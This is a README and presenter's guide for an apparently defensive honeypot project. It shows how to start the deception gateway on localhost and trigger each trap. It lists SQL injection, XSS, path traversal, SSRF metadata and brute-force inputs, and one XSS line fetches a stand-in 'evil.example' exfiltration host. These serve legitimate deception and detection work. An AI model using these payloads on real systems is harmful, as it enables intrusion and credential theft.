# InnoTech Honeypot (Evation Cyber Platform)

Monorepo for the InnoTech HR honeypot: deceptive gateway traps, air-gapped telemetry, and the Blue Team admin dashboard.

**Codebase map:** [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) — traps, telemetry, admin API, shared packages.

## Start the server (Docker)

```bash

cd infra
docker compose up --build
```

| URL | Role |
|-----|------|
| http://localhost:8080/gateway/ | HR portal + traps |
| http://localhost:8080/gateway/login | Sign-in |
| http://localhost:8080/gateway/workspace/ | Landing page after login |
| http://localhost:8080/gateway/dashboard/ | Attack monitor (`role=admin`) |

**Verify:** Dashboard status **Live**. Logs: `docker compose logs -f gateway telemetry` (from `infra/`).

Trap scripts: [scripts/yaniv-test/README.md](scripts/yaniv-test/README.md) · `pnpm trap:demo` / `pnpm trap:chain` (server must be running).

---

# Attack demo guide

Use this checklist when presenting. In the browser use **only** `http://localhost:8080` — HR portal at `/gateway/*`. After login → `/gateway/workspace/`; telemetry at `/gateway/dashboard/` (sidebar when `role` is `admin`).

## Quick reference

| Trap | Trigger (natural) | Direct URL (optional) |
|------|-------------------|------------------------|
| SQLi | SQL patterns in login / URL / contact / database query | See §1 (bypass → database console) |
| XSS (Sandbox) | Script tags in URL or contact form message | — |
| Data Bomb | `download=backup.zip` | `/gateway/internal/exports/archive` |
| Brute Force | 5+ failed logins on `/gateway/login` | `/gateway/internal/console?breach=legacy` |
| Recon (Fake admin) | `.env`, `wp-admin`, etc. | `/gateway/internal/console` |
| Honey Token | API keys page + Bearer header | `/gateway/internal/integrations/keys` |
| Path traversal (LFI) | `../`, `/etc/passwd` in URL/body | `/gateway/internal/services/files?file=../../../etc/passwd` |
| SSRF | `url=http`, `169.254`, metadata hints | `/gateway/internal/services/fetch-status?url=http://169.254.169.254/latest/meta-data/` |
| Scanner | User-Agent: sqlmap, nikto, nmap, … | Any request with scanner UA |

> **Blue team only:** old `/gateway/decoy-portal/*` URLs still work as silent aliases — never link them in the UI.  
> **Recon breadcrumbs (scanners only):** `/gateway/robots.txt`, `/gateway/sitemap.xml`, HTML comment in page source — not linked from HR UI.

### Attacker kill chain (decoy zone)

After SQLi bypass, brute “breach”, or honey-token use, the legacy console shows **Recommended next steps**: Database → API keys → System backup. Each step fires its own trap and shares a **`attacker_trace_id` cookie** so the admin UI can show an **Attacker chain** timeline per IP/trace.

---

## 1. SQL injection (SQLi)

### What the honeypot does (not a real DB)

- **No** SQL runs against MongoDB. Gatekeeper matches **many** SQLi patterns (not only `OR 1=1--`).
- **Employee login / register** → only `username` + `password` are scanned (username `admin` alone does **not** trigger SQLi).
- After detection on **login POST** → green **“Authentication bypass accepted”** → link **Open database console**.
- On the console, **Execute query** alternates per IP:
  - **Odd runs:** fake `users` table (passwords/hashes look real but are **not** from your DB).
  - **Even runs:** wait + random fake MySQL error (`table 'users' is full`, `too many connections`, …).

### Detection (examples that all match)

| Category | Example fragment | Why it matches |
|----------|------------------|----------------|
| Auth bypass / tautology | `' OR 1=1--` · `' OR '1'='1` · `admin") OR ("1"="1` | `OR`, `--`, quotes |
| UNION | `UNION SELECT null,null--` | `UNION`, `SELECT` |
| Stacked / terminator | `'; DROP TABLE users--` | `;`, `DROP`, `--` |
| Comment variants | `admin'--` · `test'#` · `/**/` | `--`, `#`, `/*` |
| Time-based hints | `SLEEP(5)` · `WAITFOR DELAY` · `BENCHMARK(...)` | keyword list |
| Error / metadata | `information_schema.tables` | `information_schema` |
| Functions / hex | `CHAR(65)` · `0x61646d696e` | `CHAR(`, `0x…` |

Full regex lives in `services/innotech-gateway/services/detectionService.js` (`patterns.SQLI`).

---

### Entry point A — Employee login (main demo)

**URL:** http://localhost:8080/gateway/login  

| Technique | Username (password: anything 8+ chars) | Expected UI |
|-----------|----------------------------------------|-------------|
| Classic OR | `admin' OR 1=1--` | Bypass page → database console |
| Quote OR | `' OR '1'='1' --` | Same |
| UNION in user field | `x' UNION SELECT 1,2,3--` | Same |
| Comment only | `admin'--` | Same |
| Password field SQLi | `admin` / `' OR 1=1--` | Same (password is scanned too) |

**Steps:**

1. Submit one row from the table above.  
2. Confirm green banner on `/gateway/internal/auth/legacy?sqli=bypass`.  
3. Click **Open database console**.  
4. Leave or edit the SQL box, click **Execute query**.  
5. Run again — second time should show overload/error instead of the table (or the opposite order depending on attempt count).

---

### Entry point B — Register (same detector)

**URL:** http://localhost:8080/gateway/register  

```text
Username: newuser' OR 1=1--
Password: Password123!
```

Same bypass → database console flow.

**Demo / attack triggers (browser + terminal):** see **[docs/ATTACK_DEMO_GUIDE.md](docs/ATTACK_DEMO_GUIDE.md)**.

---

### Entry point C — URL / contact (no login)

| Where | Example URL or body |
|-------|---------------------|
| Contact query | http://localhost:8080/gateway/contact?search=1%20UNION%20SELECT%20null-- |
| Contact message | POST message containing `SELECT * FROM users` |
| Any query string | http://localhost:8080/gateway/?q=test'%20OR%201=1-- |

Usually redirects to **database console** (`/gateway/internal/services/database`). Run queries there as in entry A.

---

### Entry point D — Database console only

**URL:** http://localhost:8080/gateway/internal/services/database  

Use after bypass, or when gatekeeper already flagged SQLi on the request.

**Example queries (all fake results / errors):**

```sql
SELECT * FROM users
```

```sql
SELECT username, password FROM users WHERE role='admin'
```

```sql
UNION SELECT 1,username,password,4,5 FROM users--
```

```sql
'; DROP TABLE audit_log--
```

```sql
SELECT * FROM information_schema.tables
```

Each **Execute query** POST is logged as SQLi and triggers dump **or** tarpit error.

**Direct export (no SQL typed):**

```
http://localhost:8080/gateway/internal/services/database?export=credentials
```

Same rotation as Execute query.

---

### Terminal examples

```bash
# Login bypass (auth SQLi)
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
  -X POST -d "username=admin'%20OR%201=1--&password=anything123" \
  http://localhost:8080/gateway/login

# Contact UNION
curl -sI "http://localhost:8080/gateway/contact?search=UNION%20SELECT%201,2,3--" | head -5

# Run query on database path
curl -s -X POST -d "query=SELECT+*+FROM+users" \
  http://localhost:8080/gateway/internal/services/database | head -30
```

---

### Expected telemetry

```text
[GATEWAY] threat_detected_routing_to_trap | trap=SQLI ...
[GATEWAY] sqli_bypass_illusion | ...          ← login POST only
[TRAP] tarpit_started | ...                   ← overload branch
[ATTACK] live_alert_broadcast_to_admin_ui | trap=SQLI ...
```

Admin dashboard: trap type **SQLI** / SQL injection.

---

### What is **not** real (tell the jury)

| Shown to attacker | Reality |
|-------------------|---------|
| `admin` / `InnoTech!2024` in dump | Faker + fixed demo rows |
| bcrypt hashes | Placeholder strings |
| “Authentication successful” | Cookie `legacy_admin_sess` + EJS only |
| MySQL errors | Random line from `FAKE_ERRORS` in `traps/tarpit.js` |

---

## 2. XSS → Tiered sandbox

**What the attacker sees:** Safe Zone “ticket saved” page with two behaviors:

| Tier | Example payload | Browser behavior |
|------|-----------------|------------------|
| **probe** | `<script>alert(1)</script>` | **Live preview** reflects payload → browser shows `alert` with `1` |
| **blocked** | `<script>alert(document.cookie)</script>` or `<script src=https://evil/x.js></script>` | “Content sanitized” banner; payload only in **escaped** preview (no execution) |

Simple probes (`alert` with a number or short string, `onerror=alert(1)`, etc.) run for demo realism. Payloads with cookie access, `fetch`, `eval`, external `script src`, encoding bypasses, etc. are quarantined.

### Browser — probe (demo alert)

1. http://localhost:8080/gateway/contact  
2. **Subject:** `Test ticket`  
3. **Message:** `<script>alert(1)</script>`  
4. Submit → expect **alert dialog showing `1`**.

**Or** URL only:

```
http://localhost:8080/gateway/contact?msg=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Browser — blocked (no alert)

Same form, **Message:**

```
<script>fetch('http://evil.example/exfil')</script>
```

Expect sanitized/quarantined UI only (no alert).

### Terminal

```bash
# probe — HTML includes reflection (alert only visible in a real browser)
curl "http://localhost:8080/gateway/contact?msg=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# blocked — escaped preview only
curl "http://localhost:8080/gateway/contact?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
```

### Test matrix

| Input | Expected tier |
|-------|----------------|
| `<script>alert(1)</script>` | probe → alert `1` |
| `<img src=x onerror=alert(1)>` | probe → alert |
| `<script>alert(document.cookie)</script>` | blocked |
| `<script src=https://evil.com/x.js></script>` | blocked |
| `<script>eval('alert(1)')</script>` | blocked |

### Expected telemetry

- Log: `[GATEKEEPER] threat_detected_routing_to_trap` with trap `XSS`
- Log: `[TRAP] xss_sandbox_rendered` with `xss_tier: probe` or `xss_tier: blocked`
- Admin live alert: `XSS` / `XSS_PROBE`; blocked events show payload prefix `[BLOCKED]`

---

## 3. Data bomb → Fake ZIP download

**What the attacker sees:** Browser starts downloading `backup.zip` (large stream; cancel if needed).

### Browser / URL (not shown in Safe Zone UI)

Employees never see a backup download button. Triggers when the request matches `download=backup.zip` (scanner, crafted link, or post-recon decoy UI):

```
http://localhost:8080/gateway/documents?download=backup.zip
```

**Or** from the **legacy administrator console** (after brute-force handoff or recon trap): **Download full backup (ZIP)**.

### Terminal (use timeout)

```bash
curl --max-time 5 -o /dev/null -w "%{http_code}\n" \
  "http://localhost:8080/gateway/documents?download=backup.zip"
```

### Expected telemetry

- `[GATEKEEPER] DATA_BOMB detected. Rerouting...`
- Admin: `DATA_BOMB` with growing `bytes_sent`

---

## 4. Brute force → “Successful breach” illusion

**What the attacker sees:** After **5** failed attempts on the real employee login, they are redirected to the **Administrator Console** with a green **Authentication successful** banner, **Signed in as** their username, and full access to backup download / API keys / employee table (all fake).

### Browser

1. http://localhost:8080/gateway/login  
2. Username `admin`, **wrong** password — submit **5 times**.  
3. On the **5th** failed submit you should land on  
   `http://localhost:8080/gateway/internal/console?breach=legacy`  
   with session active (cookie `legacy_admin_sess`).  
4. Optional: open **Legacy sign-in** from the sidebar and keep wrong passwords there to demo lockout (10th attempt → 423) — separate from the brute “win” moment.

### Terminal (legacy endpoint only)

```bash
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "attempt $i → %{http_code}\n" \
    -X POST -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}' \
    http://localhost:8080/gateway/internal/auth/legacy
done
```

### Expected telemetry

- `[ATTACK] event_saved_to_malicious_db | trap=BRUTE_FORCE` on the **5th** failed employee login (handoff), not mislabeled as `RECON`
- Admin live alert: `BRUTE_FORCE` with payload `handoff: breach_illusion`
- Console visit after breach does **not** duplicate a `RECON` row (already reported at handoff)

---

## 5. Recon → Fake admin dashboard (Faker)

**What the attacker sees:** InnoTech admin console with random employees/stats (refreshes on each load).

### Browser

Safe Zone home has **no** link to the legacy console. Use a scanner-style URL or direct decoy path after detection:

```
http://localhost:8080/gateway/internal/console
```

**Or** scanner-style URL:

```
http://localhost:8080/gateway/contact?path=/.env
```

```
http://localhost:8080/gateway/?q=wp-admin
```

### Terminal

```bash
curl -s "http://localhost:8080/gateway/internal/console" | head -20
```

### Expected telemetry

- `[GATEKEEPER] RECON detected...` (scanner URLs) or visit logged as `RECON` on `/internal/console`
- Admin: `RECON` or related alert

---

## 6. Honey token

**What the attacker sees:** API key page (styled like Safe Zone). Using the key on any gateway route triggers a silent alert.

### Browser — issue token

1. Open fake admin → **API integration keys**, or  
   http://localhost:8080/gateway/internal/integrations/keys  
2. Copy the `apiKey` value.

### Browser — trigger usage

- Install a header extension (e.g. ModHeader), set  
  `Authorization: Bearer <apiKey>`  
- Visit http://localhost:8080/gateway/  

**Or** terminal:

```bash
KEY="<paste apiKey here>"
curl -H "Authorization: Bearer $KEY" "http://localhost:8080/gateway/"
```

### Expected telemetry

- Log: `[HoneyTokenDetector] HIT — ...`
- Admin: `HONEY_TOKEN` then redirect to console with **API token validated** banner (`?token_ack=1`)
- Mongo: `HoneyToken` collection `triggeredLogs`
- `traceId` on the event if cookie was set

---

## 7. Path traversal (LFI) → Fake file viewer

```
http://localhost:8080/gateway/contact?file=../../../etc/passwd
```

Or direct:

```
http://localhost:8080/gateway/internal/services/files?file=../../../etc/passwd
```

**Expected:** `PATH_TRAVERSAL` event + fake `/etc/passwd` lines + kill-chain CTAs.

---

## 8. SSRF → Fake metadata bridge

```
http://localhost:8080/gateway/contact?url=http://169.254.169.254/latest/meta-data/
```

Or:

```
http://localhost:8080/gateway/internal/services/fetch-status?url=http://169.254.169.254/latest/meta-data/
```

**Expected:** `SSRF` event; JSON body with fake `instanceId` / IAM role when `Accept: application/json`.

---

## 9. Scanner User-Agent → Tarpit

```bash
curl -A "sqlmap/1.7" "http://localhost:8080/gateway/"
```

**Expected:** `SCANNER` trap, delayed response, `wasted_time_ms` in telemetry.

---

## 10. Blue team: enriched admin dashboard

Turn **Demo Mode OFF** on the dashboard so events come from the real malicious DB (not mock cards).

### Tabs to use while the attacker is in traps

| Tab | What to look for |
|-----|------------------|
| **Threat Map** | Live feed shows trap, IP, city, **traceId** (short), and **path**. Click a row → **Investigate** tab opens with that session. |
| **Attack Events** | Columns: trace, path, bot icon. Click a row → full detail: method, User-Agent, referer, fingerprint, handoff, pretty-printed payload, **Investigate attacker**. |
| **Attacker Profiles** | Risk score, geo, **traceIds** chips. **Investigate** or click a trace chip. |
| **Investigate** | Kill-chain timeline (oldest → newest), Δ time between traps, learning notes (e.g. sqlmap UA, full deception chain). |

### Per trap — what should appear in the UI

| Trap | trapType | Fields worth teaching |
|------|----------|------------------------|
| SQLi login bypass | `SQLI` / `SQL_INJECTION` | `handoffFrom: employee_login`, payload `sqli_bypass_illusion`, path `/gateway/login` |
| SQLi dump / tarpit | `SQLI` | path database console; payload `credential_dump` or tarpit wait |
| Brute 5× login | `BRUTE_FORCE` | `handoff: breach_illusion` **before** console visit; then `RECON` on console with `?breach=legacy` skipped as duplicate handoff |
| Recon / console | `RECON` | path `/internal/console` |
| Honey token | `HONEY_TOKEN` | path keys page; optional `token_ack` on console |
| Data bomb | `DATA_BOMB` | high `bytes_sent`, archive path |
| XSS | `XSS_PROBE` | `xssTier` when set |
| Path traversal | `PATH_TRAVERSAL` | payload `file: ../../../…` |
| SSRF | `SSRF` | payload target URL |
| Scanner | `SCANNER` | payload `scanner_ua`, long `wasted_time_ms` |

### Correlation mechanics

- Cookie **`attacker_trace_id`** is created on first gateway hit and stored on every `attack_events` document as **`traceId`**.
- Gateway **`report()`** sends fingerprint + HTTP context; telemetry **`POST /internal/live-alert`** upserts **AttackerProfile** and enriches geo on the socket payload.
- API: `GET /api/admin/events?traceId=…` · `GET /api/admin/attackers/{ip}/timeline?traceId=…`

**Demo tip:** Run the kill chain in §Presentation flow in one browser session, then open **Investigate** with that IP and the trace chip — you should see SQLi → RECON → DATA_BOMB (or similar) with seconds between steps.

---

## 11. Telemetry smoke test (no gateway)

Confirms Socket.IO + DB without attacking the gateway UI:

```bash
cd infra
docker compose exec telemetry npm run mock-attack
```

Expect five success lines and exit code `0`.

---

## Presentation flow (suggested order)

1. Log in as `admin` → lands on workspace; open **Attack monitor** from the sidebar → http://localhost:8080/gateway/dashboard/ — Live + map.  
2. **SQLi** — try `admin' OR 1=1--` on login → bypass → database console → **Execute query** twice (dump vs error).  
3. **XSS** via contact form → sandbox page + alert.  
4. **Data bomb** via `documents?download=backup.zip` (not on Safe Zone home).  
5. **Brute force** 5× wrong login → fake admin console (breach illusion).  
6. **Recon** via scanner URL or `/internal/console`.  
7. **Honey token** issue + one request with Bearer token.  

---

## Reading console logs during a demo

Logs use a single readable format (no emojis):

```text
[SERVICE] what_happened | field=value field2=value
```

| Prefix | Process | Meaning |
|--------|---------|---------|
| `[GATEWAY]` | `innotech-gateway` | Detection, routing, login brute handoff |
| `[TRAP]` | gateway | Trap started/ended, HTTP notify to telemetry |
| `[ATTACK]` | both | Event saved to Mongo, live alert broadcast |
| `[TELEMETRY]` | `logging-data-extraction` | Server/socket lifecycle, gateway relay |

**Typical SQLi flow in the terminal (login → query):**

```text
[GATEWAY] threat_detected_routing_to_trap | trap=SQLI ...
[GATEWAY] sqli_bypass_illusion | username=admin ...
[GATEWAY] threat_detected_routing_to_trap | trap=SQLI ...   ← POST database query
[TRAP] tarpit_started | hold_ms=...                         ← or credential dump (no tarpit log)
[ATTACK] live_alert_broadcast_to_admin_ui | trap=SQLI ...
```

Watch logs: `docker compose logs -f gateway telemetry` (from `infra/`).

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| 404 on `/login` | Sign in at **`http://localhost:8080/gateway/login`** (canonical) |
| Two different login pages | Old EJS login redirects here; attack dashboard is only at **`/`** for `admin` role |
| Only “loading”, no tarpit text | Wait up to 2 minutes; or use `curl -N` |
| Admin Offline | `docker compose restart`; socket token match in `apps/admin-panel/.env` |
| 502 on `/gateway/` | `docker compose logs gateway` — need `server_listening` |
| No live alert from gateway | `docker compose ps` — telemetry + gateway Up; `docker compose logs telemetry` |
| Trap works but wrong DB | Check `SAFEZONE_DB_URI` / `MALICIOUS_DB_URI` in `.env` |

---

## Architecture (one line)

**Gatekeeper** (`getThreatTypes`, primary + secondary) → **decoyReroute** → trap + **`report()`** (Mongo + fingerprint + `traceId`) → HTTP **live alert** → telemetry **profile upsert** + **Socket.IO** `liveAlert` → admin UI timeline.
